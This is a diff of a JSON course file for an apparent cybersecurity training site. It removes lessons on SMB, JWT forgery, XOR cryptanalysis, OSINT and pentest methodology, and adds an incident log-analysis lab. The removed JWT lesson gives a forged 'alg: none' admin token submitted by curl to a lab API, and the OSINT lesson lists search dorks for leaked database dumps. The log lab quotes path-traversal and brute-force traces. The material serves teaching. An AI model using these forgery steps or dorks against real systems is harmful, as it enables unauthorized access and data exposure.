     ],
-    "explainResult": "The `smbclient` binary negotiated SMB protocol dialect with Samba on port 445, requested share tree descriptors, and printed the directory table.",
-    "securityConnection": "SMB vulnerabilities have fueled some of the most destructive cyber attacks in history (including the EternalBlue exploit CVE-2017-0144 used in the WannaCry ransomware outbreak). Auditing SMB configurations is a core phase of internal network penetration tests.",
-    "practicalRoomLink": {
-      "label": "Ready for hands-on practice?",
-      "buttonText": "Open Practical SMB & Network Share Enumeration Lab",
-      "url": "labs.html?lab=smb"
-    },
-    "completion": {
-      "learned": [
-        "The role of the Server Message Block (SMB) protocol on port 445",
-        "The risks of Null Sessions and Anonymous Guest access",
-        "Using smbclient to enumerate available shares and permissions",
-        "Hardening file servers against unauthorized network discovery"
-      ],
-      "practiced": [
-        "smbclient -L //10.10.10.25 -N",
-        "Enumerating network shares",
-        "Analyzing Windows/Samba file sharing security"
-      ]
-    },
-    "nextRoomId": "room-33"
+    "securityConnection": "This lab directly maps to **Lab 08: Network Service & SMB Enumeration** (`lab-network`), providing safe hands-on experience scanning live targets and extracting information from unauthenticated network services.",
+    "id": "room-43",
+    "nextRoomId": "room-44"
   },
   {
-    "id": "room-33",
-    "stage": 9,
-    "stageTitle": "Stage 9 — Modern Security",
-    "title": "JSON Web Tokens (JWT) & Token Security",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
+    "stage": 7,
+    "level": 7,
+    "levelTitle": "Level 7 \u2014 First Practical Security Labs",
+    "title": "Security Incident Log Analysis (Practical Lab 09)",
+    "difficulty": "Practical",
+    "difficultyBadge": "\ud83d\udd34 Practical",
     "estimatedTime": "35 min",
-    "prerequisites": "Room 13 (Cookies & Sessions) & Room 18 (Cryptography)",
-    "whyAreYouHere": "Traditional web apps stored session state in a server database. Modern cloud, microservices, and mobile apps use **JSON Web Tokens (JWTs)** instead. A JWT is a self-contained, stateless identity token containing claims about the user. But when developers misconfigure JWT libraries — such as accepting the infamous `none` algorithm or using weak secret keys — attackers can forge administrator tokens at will! In this room, you will dissect JWT tokens and exploit common signature vulnerabilities.",
+    "prerequisites": "Room 43: Network Service & Port Reconnaissance",
+    "whyAreYouHere": "When a company experiences a breach, incident response analysts reconstruct the attacker's timeline by analyzing web and system logs. In this practical lab, you investigate a compromised web server by analyzing Apache `access.log` and Linux `auth.log` to track an attacker who exploited directory traversal to upload a web shell, and identify an ongoing SSH brute-force attack.",
     "objectives": [
-      "Understand the architecture of JSON Web Tokens: Header, Payload, and Signature",
-      "Learn how JWTs are encoded using Base64Url (three parts separated by dots)",
-      "Understand how cryptographic signatures guarantee token integrity",
-      "Explore the classic `alg: none` signature bypass vulnerability",
-      "Inspect and decode JWT tokens in the terminal"
+      "Inspect web server access logs with `cat access.log | head -n 2`",
+      "Isolate web directory traversal attacks using regex filters `grep -E \"\\.\\./\" access.log`",
+      "Trace malicious web shell uploads using `grep uploads access.log`",
+      "Identify external SSH brute-force attacks in `auth.log` using `grep \"Failed password\" auth.log`",
+      "Synthesize findings in `incident_summary.txt` and verify the incident response flag"
     ],
     "vocabulary": [
       {
-        "term": "JWT (JSON Web Token)",
-        "definition": "An open standard (RFC 7519) that defines a compact, URL-safe means for securely transmitting assertions between parties as a JSON object."
+        "term": "Web Shell",
+        "definition": "A malicious script (PHP, ASP, JSP) uploaded to a web server that provides an attacker with remote command execution capabilities through a web browser."
       },
       {
-        "term": "Header",
-        "definition": "The first part of a JWT, specifying the token type and cryptographic signing algorithm (e.g. `HS256` or `RS256`)."
+        "term": "Brute-Force Attack",
+        "definition": "An automated trial-and-error attack that systematically attempts thousands of username and password combinations until the correct one is found."
       },
       {
-        "term": "Payload (Claims)",
-        "definition": "The second part of a JWT, containing user identity data, role permissions, and expiration timestamps."
-      },
-      {
-        "term": "Signature",
-        "definition": "The third part of a JWT, generated by hashing the header and payload with a secret key, used to verify the token has not been tampered with."
-      },
-      {
-        "term": "alg: none",
-        "definition": "A legacy algorithm specification in early JWT libraries that disables signature verification entirely."
+        "term": "auth.log",
+        "definition": "The standard Linux authentication log file (`/var/log/auth.log`) that records all user logins, failed passwords, and sudo executions."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Anatomy of a JWT",
-        "content": "A JWT looks like three strings joined by dots:\n```text\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FkZXQiLCJyb2xlIjoidXNlciJ9.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk\n```\n• **Part 1 (Header - Red)**: Base64Url decoded: `{\"alg\":\"HS256\",\"typ\":\"JWT\"}`\n• **Part 2 (Payload - Purple)**: Base64Url decoded: `{\"user\":\"cadet\",\"role\":\"user\"}`\n• **Part 3 (Signature - Blue)**: `HMACSHA256(Base64Url(Header) + \".\" + Base64Url(Payload), secret_key)`\nBecause the parts are only Base64Url encoded, **anyone can read the payload**! The signature only prevents *modifying* it."
+        "title": "1. Forensic Investigation Steps",
+        "content": "In Lab 09, you investigate an enterprise security incident:\n\n1. Inspect raw web traffic: `cat access.log | head -n 2`.\n2. Isolate directory traversal attempts: `grep -E \"\\.\\./\" access.log`.\n   - You spot an attacker testing `../../../../etc/passwd`!\n3. Search for malicious file uploads: `grep uploads access.log`.\n   - You identify the attacker uploading `shell.php` to `/uploads/shell.php`!\n4. Inspect SSH authentication logs: `grep \"Failed password\" auth.log`.\n   - Reveals thousands of failed login attempts against root from external IP `198.51.100.23`!\n5. Record findings in `incident_summary.txt` and retrieve the flag!"
       },
       {
-        "title": "2. The 'None' Algorithm Flaw",
-        "content": "In some vulnerable JWT libraries, the backend trusts whatever algorithm is declared in the token header:\nIf an attacker changes the header to:\n`{\"alg\":\"none\",\"typ\":\"JWT\"}`\nand changes the payload to:\n`{\"user\":\"admin\",\"role\":\"administrator\"}`\nand strips the signature:\n`Header.Payload.`\nThe vulnerable server sees `alg: none`, skips signature verification, and logs the attacker in as administrator! Modern libraries explicitly reject `none`."
+        "title": "2. Attack Reconstruction and Log Correlation",
+        "content": "Security incident response is digital detective work. By cross-referencing timestamps between web server access logs (`access.log`) and operating system authentication logs (`auth.log`), analysts prove an attacker's complete kill chain: from initial web directory traversal and web shell execution to brute-forcing SSH credentials from the exact same external IP address."
       }
     ],
     "seeExamples": [
       {
-        "title": "Decoding a JWT in Bash",
-        "codeOrDiagram": "cadet@endlessus:~$ echo \"eyJ1c2VyIjoiY2FkZXQiLCJyb2xlIjoidXNlciJ9\" | base64 -d\n{\"user\":\"cadet\",\"role\":\"user\"}",
-        "explanation": "JWT payloads are not encrypted! They are simply Base64Url strings. Never store sensitive secrets or plaintext passwords inside a JWT."
+        "title": "Isolating Attacks in Logs",
+        "codeOrDiagram": "cadet@endlessus:~$ grep -E \"\\.\\./\" access.log\n198.51.100.23 - - [15/Oct/2026:10:14:02] \"GET /view?file=../../etc/passwd HTTP/1.1\" 200 1840\n\ncadet@endlessus:~$ grep \"Failed password\" auth.log | head -n 2\nOct 15 10:15:01 server sshd[4201]: Failed password for root from 198.51.100.23 port 51240 ssh2\nOct 15 10:15:03 server sshd[4203]: Failed password for root from 198.51.100.23 port 51242 ssh2",
+        "explanation": "Filtering access and authentication logs proves attacker IP 198.51.100.23 performed both directory traversal and SSH brute force."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Simulate submitting a tampered JWT with role escalated to administrator against the lab validation API: `curl -H \"Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.\" http://localhost:8080/api/admin`:",
+      "prompt": "Run `grep \"Failed password\" auth.log | head -n 2` to inspect SSH brute-force attack attempts:",
       "initialCommand": "",
-      "expectedCommand": "curl -H \"Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.\" http://localhost:8080/api/admin",
-      "simulatedOutput": "HTTP/1.1 200 OK\n{\"access\":\"GRANTED\",\"user\":\"admin\",\"secret_flag\":\"flag{jwt_none_algorithm_exploited}\"}\n[+] Success! Vulnerable server accepted unsigned 'none' algorithm token.",
-      "explanation": "The vulnerable server read the header algorithm, observed `none`, skipped the cryptographic verification, and granted admin access."
+      "expectedCommand": "grep \"Failed password\" auth.log | head -n 2",
+      "simulatedOutput": "Oct 15 10:15:01 server sshd[4201]: Failed password for root from 198.51.100.23 port 51240 ssh2\nOct 15 10:15:03 server sshd[4203]: Failed password for root from 198.51.100.23 port 51242 ssh2\n[+] Incident evidence isolated: SSH brute-force detected from IP 198.51.100.23.",
+      "explanation": "Extracts failed authentication events from auth.log."
     },
     "questions": [
       {
-        "id": "r33-q1",
-        "type": "multiple-choice",
-        "question": "Is the data payload inside a standard JSON Web Token (JWT) encrypted so that third parties cannot read its contents?",
-        "options": [
-          "Yes, all JWTs are encrypted with AES-256 by default",
-          "No; JWT payloads are merely Base64Url encoded, meaning anyone who intercepts the token can read all claims and user data inside it",
-          "Yes, provided the token uses HTTPS",
-          "No, because JWTs can only contain numbers"
+        "id": "q-44-1",
+        "type": "exact",
+        "question": "Which standard Linux log file (/var/log/...) records user logins, failed password attempts, and sudo authentication events?",
+        "visualSlots": "_ _ _ _ . _ _ _",
+        "acceptedAnswers": [
+          "auth.log"
         ],
-        "correctIndex": 1,
-        "explanation": "JWTs are signed, NOT encrypted (unless using JWE). The payload is plain Base64Url that anyone can decode."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Eight characters: auth.log.",
+        "explanation": "/var/log/auth.log records system authentication activity."
       },
       {
-        "id": "r33-q2",
+        "id": "q-44-2",
         "type": "multiple-choice",
-        "question": "How does a secure backend properly defend against the `alg: none` JWT vulnerability?",
+        "question": "In a web access log, what does a pattern like `/view?file=../../../../etc/passwd` signify?",
         "options": [
-          "By allowing the client to specify any algorithm they want",
-          "By hardcoding the expected signing algorithm on the server (e.g. enforcing HS256) and rejecting tokens that specify unexpected algorithms",
-          "By restarting the web server every hour",
-          "By removing the signature from all tokens"
+          "A normal CSS stylesheet request",
+          "A Directory Traversal / Path Traversal attack attempting to access files outside the web root",
+          "A Denial of Service flood",
+          "An SQL database backup"
         ],
         "correctIndex": 1,
-        "explanation": "Servers should never trust the client's header algorithm; they must enforce an expected algorithm whitelist on the backend."
+        "hint": "Path traversal pattern: dot-dot-slash.",
+        "explanation": "Using '../' sequences to climb out of the web document root is a Path Traversal attack."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Exploit Unsigned JWT Token",
-        "instruction": "Submit the forged `alg: none` JWT bearer token to access `/api/admin`.",
+        "title": "Task 1: Complete log investigation",
+        "instruction": "Open Lab 09 in the Practice Terminal to analyze access.log and auth.log.",
         "hints": [
-          "Concept: JWT signature bypass via none algorithm.",
-          "Direction: Send bearer token in Authorization header.",
-          "Tool: `curl`",
-          "Syntax: Run the provided curl command.",
-          "Explanation: Bypasses token verification."
+          "Type: `grep -E \"\\.\\./\" access.log`",
+          "Type: `grep uploads access.log`",
+          "Type: `grep \"Failed password\" auth.log`",
+          "Type: `cat incident_summary.txt`"
         ]
       }
     ],
-    "explainResult": "The JWT library lacked an algorithm whitelist, executing `jwt.verify(token, secret, { algorithms: ['HS256'] })` improperly without algorithm constraints.",
-    "securityConnection": "JWT attacks are common in modern Single Page Applications (SPAs) and mobile APIs. Attackers crack weak HMAC secrets using dictionary wordlists with tools like `jwt_tool` or `john`, and test for Key Confusion attacks (swapping RS256 public keys into HS256 symmetric HMAC keys).",
-    "practicalRoomLink": {
-      "label": "Ready for hands-on practice?",
-      "buttonText": "Open Practical JSON Web Token (JWT) Lab",
-      "url": "labs.html?lab=jwt"
-    },
-    "completion": {
-      "learned": [
-        "The three-part structure of JSON Web Tokens (Header.Payload.Signature)",
-        "Why JWTs are encoded rather than encrypted",
-        "The mechanics of the `alg: none` signature bypass flaw",
-        "How to enforce strict algorithm whitelisting in backend token handlers"
-      ],
-      "practiced": [
-        "curl -H \"Authorization: Bearer ...\"",
-        "Decoding Base64Url JWT structures",
-        "Testing stateless token authorization controls"
-      ]
-    },
-    "nextRoomId": "room-34"
+    "securityConnection": "This lab directly maps to **Lab 09: Security Incident Log Analysis** (`lab-logs`), giving you practical experience tracking real attack sequences through log files.",
+    "id": "room-44",
+    "nextRoomId": "room-45"
   },
   {
-    "id": "room-34",
-    "stage": 9,
-    "stageTitle": "Stage 9 — Modern Security",
-    "title": "Cryptanalysis Basics & Cipher Analysis",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "35 min",
-    "prerequisites": "Room 18 (Cryptography Fundamentals)",
-    "whyAreYouHere": "Cryptography is the science of making secret codes; **Cryptanalysis** is the science of breaking them without possessing the key. While modern AES-256 cannot be cracked by brute force, developers constantly make the mistake of creating their own 'custom ciphers' or using weak XOR keys. In this room, you will explore classical cipher analysis, understand letter frequency distributions in English, and break single-byte XOR encryption.",
-    "objectives": [
-      "Understand the difference between Cryptography and Cryptanalysis",
-      "Learn classical ciphers: Caesar Substitution and Vigenère polyalphabetic ciphers",
-      "Understand Frequency Analysis and the characteristic distribution of letters in human language (ETAOIN SHRDLU)",
-      "Master the XOR (Exclusive OR) logical operation in cryptography",
-      "Crack a single-byte XOR encrypted message using python/cli"
-    ],
-    "vocabulary": [
-      {
-        "term": "Cryptanalysis",
-        "definition": "The study of analyzing information systems in order to study the hidden aspects of the systems and decipher ciphertext without knowing the secret key."
-      },
-      {
-        "term": "Frequency Analysis",
-        "definition": "The study of the frequency of letters or groups of letters in a ciphertext to break substitution ciphers based on linguistic patterns."
-      },
-      {
-        "term": "Substitution Cipher",
-        "definition": "A method of encryption by which units of plaintext are replaced with ciphertext according to a fixed system or key."
-      },
-      {
-        "term": "XOR (Exclusive OR)",
-        "definition": "A bitwise logical operation where the output is 1 if and only if the inputs differ. It is reversible: `(A ⊕ B) ⊕ B = A`."
-      },
-      {
-        "term": "Kerckhoffs's Principle",
-        "definition": "The cryptographic axiom stating that a cryptosystem should be secure even if everything about the system, except the key, is public knowledge."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. Frequency Analysis: English Has a Fingerprint",
-        "content": "In the English language, letters do not appear with equal probability:\n• **'E'** is the most common letter (~12.7% of all text).\n• **'T'**, **'A'**, **'O'**, **'I'**, **'N'** come next.\n• **'Z'**, **'Q'**, **'X'** are extremely rare.\n\nIf you analyze an encrypted book where every letter is shifted, and the letter **'P'** appears 13% of the time, 'P' is almost certainly the encrypted substitution for **'E'**! By matching frequencies, simple substitution ciphers unravel in minutes."
-      },
-      {
-        "title": "2. The Magic of XOR (Exclusive OR)",
-        "content": "XOR (`^` or `⊕`) is the most fundamental building block in modern cryptography:\n```text\n0 ⊕ 0 = 0\n1 ⊕ 1 = 0\n1 ⊕ 0 = 1\n0 ⊕ 1 = 1\n```\nThe beauty of XOR is that it is its own inverse:\n`Plaintext ⊕ Key = Ciphertext`\n`Ciphertext ⊕ Key = Plaintext`\nIf a weak developer encrypts data by XORing every byte with a single repeating character (e.g. `0x55`), an analyst only needs to test 256 possible byte keys to find the plaintext!"
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Frequency of Letters in English",
-        "codeOrDiagram": "Letter   Frequency (%)\n  E      █████████████ 12.7%\n  T      █████████ 9.1%\n  A      ████████ 8.2%\n  O      ███████ 7.5%\n  I      ███████ 7.0%\n  N      ███████ 6.7%\n  S      ██████ 6.3%\n  H      ██████ 6.1%",
-        "explanation": "Frequency analysis relies on this mathematical curve to crack substitution ciphers."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Decrypt a single-byte XOR encrypted hex string (`1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736`) by scoring English character frequencies in python: `python3 -c \"ct = bytes.fromhex('1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736'); print(''.join([chr(b ^ 0x58) for b in ct]))\"`:",
-      "initialCommand": "",
-      "expectedCommand": "python3 -c \"ct = bytes.fromhex('1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736'); print(''.join([chr(b ^ 0x58) for b in ct]))\"",
-      "simulatedOutput": "Cooking MC's like a pound of bacon\n[+] Success! XOR key 0x58 (character 'X') recovered cleartext message.",
-      "explanation": "Testing single-byte keys from 0 to 255 quickly recovers the plaintext because 256 keys can be brute-forced in under 1 millisecond."
-    },
-    "questions": [
-      {
-        "id": "r34-q1",
-        "type": "multiple-choice",
-        "question": "What is Kerckhoffs's Principle in cryptography?",
-        "options": [
-          "Security must rely on keeping the mathematical algorithm top-secret",
-          "A cryptosystem must be secure even if everything about the design and algorithm is public, provided the cryptographic key remains secret",
-          "All encryption keys must be exactly 10 characters long",
-          "Computers should never use binary numbers"
-        ],
-        "correctIndex": 1,
-        "explanation": "Kerckhoffs's Principle establishes that 'security through obscurity' of algorithms fails; true security depends solely on the secrecy of the key."
-      },
-      {
-        "id": "r34-q2",
-        "type": "multiple-choice",
-        "question": "Why is single-byte XOR encryption trivially broken by cryptanalysts?",
-        "options": [
-          "Because XOR only works on uppercase letters",
-          "Because there are only 256 possible single-byte keys (0x00 to 0xFF), allowing a computer to test every key in milliseconds and score the output for readable English words",
-          "Because XOR destroys the hard drive",
-          "Because single-byte keys are illegal"
-        ],
-        "correctIndex": 1,
-        "explanation": "A single byte has only 256 possible permutations, making exhaustive key space search instantaneous."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Recover XOR Ciphertext",
-        "instruction": "Run the Python one-liner to decrypt the single-byte XOR string.",
-        "hints": [
-          "Concept: Single-byte XOR key recovery.",
-          "Direction: Apply key 0x58 against ciphertext bytes.",
-          "Tool: `python3`",
-          "Syntax: Run the complete python command.",
-          "Explanation: Reverses XOR transformation."
-        ]
-      }
-    ],
-    "explainResult": "The Python script converted the hex string into raw bytes, applied the bitwise XOR operator (`^`) with key `0x58` against each byte, and decoded the ASCII characters.",
-    "securityConnection": "Malware authors frequently use single-byte XOR or simple Caesar ciphers to obfuscate command-and-control IP addresses or API keys inside their malware binaries to evade antivirus string matching. Reverse engineers use cryptanalysis to extract these strings in seconds.",
-    "practicalRoomLink": {
-      "label": "Ready for hands-on practice?",
-      "buttonText": "Open Practical Cryptography & Ciphertext Analysis Lab",
-      "url": "labs.html?lab=crypto"
-    },
-    "completion": {
-      "learned": [
-        "The distinction between Cryptography (making) and Cryptanalysis (breaking)",
-        "How letter frequency analysis breaks monoalphabetic substitution ciphers",
-        "The mathematical properties and reversibility of the XOR operation",
-        "Kerckhoffs's Principle and the fallacy of 'security through obscurity'"
-      ],
-      "practiced": [
-        "python3 -c \"...\"",
-        "Decrypting XOR ciphertexts",
-        "Evaluating cryptographic key spaces"
-      ]
-    },
-    "nextRoomId": "room-35"
-  },
-  {
-    "id": "room-35",
-    "stage": 10,
-    "stageTitle": "Stage 10 — Junior Pentester",
-    "title": "Reconnaissance & OSINT",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "35 min",
-    "prerequisites": "Stage 2 (Networking) & Stage 5 (Tools)",
-    "whyAreYouHere": "Before a military general attacks a castle, they send scouts to study the gates, guard rotations, and supply lines. In cybersecurity, this is **Reconnaissance**. Over 70% of a successful penetration test is thorough reconnaissance. In this room, you will learn the difference between Passive and Active Reconnaissance, master Open Source Intelligence (OSINT), and uncover subdomains and technology stacks without alerting target defenses.",
-    "objectives": [
-      "Differentiate between Passive Reconnaissance (undetectable) and Active Reconnaissance (touching the target)",
-      "Master Open Source Intelligence (OSINT) gathering methodologies",
-      "Learn Subdomain Enumeration techniques (Certificate Transparency, DNS brute force)",
-      "Perform Search Engine Dorking to discover leaked documents and backup files",
-      "Identify target web technology stacks using `whatweb` and `wappalyzer`"
-    ],
-    "vocabulary": [
-      {
-        "term": "Reconnaissance (Recon)",
-        "definition": "The preliminary phase of an engagement where the tester gathers as much intelligence as possible about the target's infrastructure, people, and technologies."
-      },
-      {
-        "term": "Passive Reconnaissance",
-        "definition": "Gathering information without directly transmitting packets to or touching the target's servers (e.g. searching WHOIS, Certificate Transparency logs, public GitHub repositories)."
-      },
-      {
-        "term": "Active Reconnaissance",
-        "definition": "Directly probing or interacting with the target's systems (e.g. port scanning with Nmap, web fuzzing, banner grabbing)."
-      },
-      {
-        "term": "OSINT (Open Source Intelligence)",
-        "definition": "Intelligence collected from publicly available sources including domain registries, social networks, archived web pages, and government records."
-      },
-      {
-        "term": "Google Dorking (Dork)",
-        "definition": "Using advanced search engine operators (e.g. `site:`, `filetype:`, `intitle:`) to locate exposed files, database dumps, and sensitive directories."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. Passive vs Active Recon",
-        "content": "• **Passive Reconnaissance**: You query third-party public registries. You check **crt.sh** for TLS Certificate Transparency logs, examine archived snapshots on the **Wayback Machine**, or search **Shodan**. The target server's logs show *zero* traffic from you!\n• **Active Reconnaissance**: You send Nmap probes, scan ports with `masscan`, and send HTTP GET requests. The target's firewall and intrusion detection systems immediately see your IP address."
-      },
-      {
-        "title": "2. The Art of Search Engine Dorking",
-        "content": "Search engines index millions of inadvertently exposed files:\n• `site:target.com filetype:pdf \"confidential\"`: Finds leaked internal executive briefings.\n• `site:target.com filetype:sql \"INSERT INTO\"`: Finds accidentally published database backup dumps!\n• `site:target.com inurl:admin`: Uncovers hidden administrative login portals."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Subdomain Enumeration using crt.sh",
-        "codeOrDiagram": "cadet@endlessus:~$ curl -s \"https://crt.sh/?q=%.endlessus.in&output=json\" | jq -r '.[].name_value' | sort -u\nendlessus.in\nadmin.endlessus.in\napi.endlessus.in\ndev-staging.endlessus.in    <-- Prime target! Staging environments often have outdated code.\nvpn.endlessus.in",
-        "explanation": "Because certificate authorities must publicly log every issued TLS certificate, querying Certificate Transparency logs discovers hidden subdomains passively."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Simulate passive web technology fingerprinting against lab host `https://endlessus.in` using whatweb: `whatweb https://endlessus.in`:",
-      "initialCommand": "",
-      "expectedCommand": "whatweb https://endlessus.in",
-      "simulatedOutput": "https://endlessus.in [200 OK] Country[UNITED STATES], HTML5, HTTPS[TLSv1.3], IP[185.199.108.153], Script, Title[Mihraj Mashhoor K | Security Knowledge Base], GitHub-Pages\n[+] Success! Technology profile generated: GitHub-Pages, TLS 1.3, HTML5.",
-      "explanation": "`whatweb` analyzes HTTP headers, cookies, HTML source tags, and script references to identify the underlying CMS and web platform."
-    },
-    "questions": [
-      {
-        "id": "r35-q1",
-        "type": "multiple-choice",
-        "question": "A penetration tester searches the Wayback Machine (Internet Archive) and Certificate Transparency logs (crt.sh) to find previous versions of a company's website. Which reconnaissance category is this?",
-        "options": [
-          "Active Reconnaissance",
-          "Passive Reconnaissance",
-          "Denial of Service",
-          "Privilege Escalation"
-        ],
-        "correctIndex": 1,
-        "explanation": "Because the tester queries third-party public caches without sending any network traffic to the target company's servers, it is strictly Passive Recon."
-      },
-      {
-        "id": "r35-q2",
-        "type": "multiple-choice",
-        "question": "Which Google Dork operator restricts search results exclusively to files of a specific extension, such as finding leaked spreadsheets or configuration files?",
-        "options": [
-          "site:",
-          "filetype:",
-          "cache:",
-          "related:"
-        ],
-        "correctIndex": 1,
-        "explanation": "The `filetype:` (or `ext:`) search operator restricts results to specific file types (e.g. `filetype:env` or `filetype:xls`)."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Profile Target Technology",
-        "instruction": "Run `whatweb https://endlessus.in` to fingerprint server technologies and frameworks.",
-        "hints": [
-          "Concept: Web technology fingerprinting.",
-          "Direction: Use whatweb against the target URL.",
-          "Tool: `whatweb`",
-          "Syntax: `whatweb https://endlessus.in`",
-          "Explanation: Identifies CMS and server headers."
-        ]
-      }
-    ],
-    "explainResult": "The `whatweb` utility performed banner analysis and signature matching against hundreds of web technology heuristics to profile the hosting environment.",
-    "securityConnection": "Reconnaissance dictates the attack path. If passive recon discovers an outdated staging server (`dev.company.com`) running an old version of WordPress with known vulnerabilities, the tester can focus their active efforts there rather than attacking the hardened production load balancer.",
-    "completion": {
-      "learned": [
-        "The difference between Passive and Active Reconnaissance",
-        "How OSINT gathers intelligence without alerting target security teams",
-        "Subdomain enumeration via Certificate Transparency logs (crt.sh)",
-        "Search engine dorking operators and technology fingerprinting"
-      ],
-      "practiced": [
-        "whatweb https://endlessus.in",
-        "Fingerprinting web technologies",
-        "Analyzing public reconnaissance vectors"
-      ]
-    },
-    "nextRoomId": "room-36"
-  },
-  {
-    "id": "room-36",
-    "stage": 10,
-    "stageTitle": "Stage 10 — Junior Pentester",
-    "title": "Penetration Testing Methodology & Execution",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "30 min",
-    "prerequisites": "Room 35 (Reconnaissance & OSINT)",
-    "whyAreYouHere": "A common misconception is that a penetration tester randomly opens a terminal and starts throwing random exploits at a server. In the professional world, that is the fastest way to get fired, crash production servers, or get sued! Real penetration testing is a disciplined, systematic engineering methodology guided by established industry standards (such as PTES and NIST SP 800-115). In this room, you will learn the 6-phase penetration testing lifecycle from initial scope to the final executive security report.",
-    "objectives": [
-      "Understand the 6 distinct phases of the Penetration Testing Execution Standard (PTES)",
-      "Learn the importance of Pre-engagement, Rules of Engagement (RoE), and Scope Definition",
-      "Understand the progression: Recon -> Enumerate -> Identify -> Exploit -> Post-Exploit -> Report",
-      "Learn how vulnerabilities are classified and scored using the Common Vulnerability Scoring System (CVSS)",
-      "Understand the structure of a professional pentest deliverable report"
-    ],
-    "vocabulary": [
-      {
-        "term": "PTES",
-        "definition": "Penetration Testing Execution Standard: a widely adopted framework defining the standardized phases of a penetration testing engagement."
-      },
-      {
-        "term": "Rules of Engagement (RoE)",
-        "definition": "The legal contract specifying approved testing hours, prohibited attack vectors (e.g. no DDoS, no physical break-ins), emergency contacts, and IP whitelists."
-      },
-      {
-        "term": "CVSS",
-        "definition": "Common Vulnerability Scoring System: an open industry standard for assessing the severity of computer system security vulnerabilities on a scale from 0.0 to 10.0."
-      },
-      {
-        "term": "Proof of Concept (PoC)",
-        "definition": "A minimal demonstration or code snippet showing that a vulnerability exists and can be realistically exploited."
-      },
-      {
-        "term": "Executive Summary",
-        "definition": "The opening section of a pentest report written in non-technical business language, explaining overall risk, business impact, and strategic recommendations."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The 6-Phase PTES Methodology",
-        "content": "Professional engagements follow a repeatable cycle:\n1. **Pre-engagement Interactions**: Define scope, legal contracts, IP boundaries, and emergency contact procedures.\n2. **Intelligence Gathering (Recon)**: OSINT, domain mapping, network ranges.\n3. **Threat Modeling & Enumeration**: Port scanning, service fingerprinting, web fuzzing.\n4. **Vulnerability Analysis**: Identifying specific CVEs, misconfigurations, or logic flaws.\n5. **Controlled Exploitation**: Executing verified PoC exploits to gain an initial foothold without corrupting client data.\n6. **Post-Exploitation**: Assessing business impact (privilege escalation, sensitive data access), cleaning up artifacts, and documenting evidence."
-      },
-      {
-        "title": "2. The Ultimate Deliverable: The Report",
-        "content": "Clients do not pay for your exploitation skills; **they pay for your report**.\nA professional report contains:\n• **Executive Summary**: Clear, non-technical risk overview for the CEO and board of directors.\n• **Technical Findings**: Each vulnerability with: Title, CVSS Score, Affected Asset, Reproduction Steps (PoC), Business Impact, and Concrete Remediation Guidance."
-      }
